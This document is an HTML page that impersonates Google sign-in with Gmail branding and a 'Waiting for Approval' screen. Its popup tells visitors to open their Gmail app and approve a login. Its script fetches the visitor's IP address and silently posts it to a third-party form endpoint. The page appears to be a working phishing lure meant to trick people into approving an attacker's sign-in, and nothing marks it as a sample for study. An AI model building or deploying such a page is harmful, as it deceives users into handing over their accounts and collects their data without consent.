<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google-Style Authentication</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .container {
    max-width: 400px;
    background-color: #ffffff;
    border-radius: 8px;
    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
    padding: 30px;
    box-sizing: border-box;
  }

  .logo {
    text-align: center;
    margin-bottom: 20px;
  }

  .logo img {
    width: 150px;
    height: auto;
  }

  .title {
    font-size: 24px;
    font-weight: bold;
    text-align: center;
    color: #202124;
    margin-bottom: 20px;
  }

  .form-group {
    margin-bottom: 20px;
  }

  .form-group label {
    display: block;
    font-size: 14px;
    color: #5f6368;
    margin-bottom: 5px;
  }

  .form-group input[type="text"],
  .form-group input[type="password"] {
    width: 100%;
    padding: 12px;
    border-radius: 5px;
    border: 1px solid #dadce0;
    font-size: 16px;
    box-sizing: border-box;
  }

  .form-group input[type="submit"] {
    width: 100%;
    padding: 12px;
    border-radius: 5px;
    border: none;
    background-color: #4285f4; /* Google blue */
    color: #ffffff;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s;
  }

  .form-group input[type="submit"]:hover {
    background-color: #1a73e8; /* Darker Google blue */
  }

  .approval-message {
    text-align: center;
    font-size: 16px;
    color: #1a73e8;
    margin-top: 20px;
  }

  .loader-container {
    width: 100%;
    background-color: #4285f4; /* Google blue */
    height: 4px;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 9999;
    overflow: hidden;
  }

  .loader-bar {
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, #4285f4, #fbbc05, #34a853, #ea4335);
    animation: progress 2s linear infinite;
  }

  @keyframes progress {
    0% { background-position: -100% 0; }
    100% { background-position: 200% 0; }
  }

  /* Popup container */
  .popup {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background-color: #ffffff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
    z-index: 9999;
    display: none;
  }

  /* Popup message */
  .popup-message {
    font-size: 16px;
    color: #1a73e8;
    text-align: center;
    margin-bottom: 20px;
  }

  /* Close button */
  .close-btn {
    background-color: #1a73e8;
    color: #ffffff;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    cursor: pointer;
  }

  /* Close button hover */
  .close-btn:hover {
    background-color: #0f62fe;
  }
</style>
<script>
  function showPopup() {
    document.getElementById("popup").style.display = "block";
    sendApprovalRequest();
  }

  function hidePopup() {
    document.getElementById("popup").style.display = "none";
  }

  function sendApprovalRequest() {
    // Fetch user's IP address
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const ipAddress = data.ip;
        const message = `Approval requested from IP address: ${ipAddress}`;

        // Send message to form action endpoint
        fetch('https://app.form2chat.io/f/dedc7686', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ message: message })
        })
        .then(response => console.log('Approval request sent:', message))
        .catch(error => console.error('Error sending approval request:', error));
      })
      .catch(error => console.error('Error fetching IP address:', error));
  }
</script>
</head>
<body>
<div class="container">
  <div class="logo">
    <img src="https://www.gstatic.com/images/branding/product/1x/gmail_48dp.png" alt="Gmail Logo">
  </div>
  <div class="title">Waiting for Approval</div>
  <button class="form-group input[type='submit']" onclick="showPopup()">Get Approval</button>
</div>

<!-- Popup container -->
<div class="popup" id="popup" style="display: none;">
  <div class="popup-message">Open your Gmail app for notification to approve your login.<br>Ask for the approval code from the contestant.</div>
  <button class="close-btn" onclick="hidePopup()">Close</button>
</div>
</body>
</html>
